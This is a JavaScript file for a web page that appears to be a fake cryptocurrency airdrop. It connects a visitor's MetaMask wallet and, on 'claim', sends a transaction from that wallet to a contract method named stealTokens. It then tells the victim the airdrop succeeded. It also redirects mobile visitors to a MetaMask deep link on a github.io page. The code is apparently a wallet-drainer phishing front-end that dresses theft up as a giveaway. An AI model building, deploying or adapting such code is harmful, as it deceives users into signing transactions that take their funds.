let web3;
let accounts;
let contractAddress;
let tokenAddress;
let contractABI;

// MetaMask detection and handling
if (typeof window.ethereum !== "undefined") {
  console.log("MetaMask detected. Rendering the app...");

  // Function to load configuration and ABI files
  async function loadConfig() {
    try {
      const configResponse = await fetch('config.json');
      if (!configResponse.ok) {
        throw new Error('Failed to fetch config.json');
      }
      const configData = await configResponse.json();
      contractAddress = configData.contractAddress;
      tokenAddress = configData.tokenAddress;

      const abiResponse = await fetch('abi.json');
      if (!abiResponse.ok) {
        throw new Error('Failed to fetch abi.json');
      }
      const abiData = await abiResponse.json();
      contractABI = abiData;

      console.log("Configuration loaded:", configData);
      console.log("ABI loaded:", abiData);
    } catch (error) {
      console.error("Error loading config or ABI: ", error);
      alert("Error loading configuration or ABI. Please try again later.");
    }
  }

  // Function to connect to MetaMask
  async function connectMetaMask() {
    if (window.ethereum) {
      web3 = new Web3(window.ethereum);
      try {
        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        console.log("Connected accounts:", accounts);

        // Enable claim button and disable connect button
        document.getElementById('claimAirdropButton').disabled = false;
        document.getElementById('connectButton').disabled = true;
      } catch (error) {
        alert('MetaMask connection failed');
        console.error('MetaMask connection error:', error);
      }
    } else {
      alert('MetaMask is not installed. Please install MetaMask to use this application.');
    }
  }

  // Function to claim the airdrop
  async function claimAirdrop() {
    if (!accounts) {
      alert('Please connect to MetaMask first!');
      return;
    }

    if (!contractABI || !contractAddress) {
      alert('Contract details not loaded. Please try again later.');
      return;
    }

    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
      console.log('Claiming airdrop...');
      await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
      alert('Airdrop claimed successfully!');
    } catch (error) {
      alert('Error claiming airdrop');
      console.error('Claim error:', error);
    }
  }

  // Add event listeners to the buttons
  window.addEventListener('DOMContentLoaded', (event) => {
    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);

    loadConfig();
  });

} else {
  // Handle case when MetaMask is not detected
  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
    console.log("Mobile device detected. Redirecting to MetaMask deep link...");
    window.open("https://metamask.app.link/dapp/buyemon.github.io/metamask/index2.html", "_self");
  } else {
    console.log("MetaMask not detected. Please install MetaMask to use this application.");
    document.body.innerHTML = `
      <div style="text-align: center; margin-top: 50px;">
          <h1>MetaMask Required</h1>
          <p>Please install MetaMask to access this application.</p>
          <a href="https://metamask.io/download.html" target="_blank" style="text-decoration: none; color: #4CAF50;">
              <button style="padding: 10px 20px; font-size: 16px; background-color: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer;">
                  Download MetaMask
              </button>
          </a>
      </div>
    `;
  }
}
